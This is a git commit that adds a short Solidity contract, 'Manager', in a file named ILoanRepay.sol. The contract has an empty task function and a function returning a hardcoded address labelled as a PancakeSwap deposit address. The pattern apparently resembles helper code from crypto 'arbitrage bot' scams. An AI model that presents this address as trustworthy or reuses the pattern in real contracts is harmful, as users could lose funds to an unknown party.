77171b70cfbaa84461ebbc9328c3136510859b1f
cyberhero1 <95272437+cyberhero1@users.noreply.github.com>
2021-11-30 09:00:34 +0200

    Create ILoanRepay.sol

---
+++ ILoanRepay.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x3587F3b8f4061c952628Bb00d5C6463244DCCA46;
+	}
+}
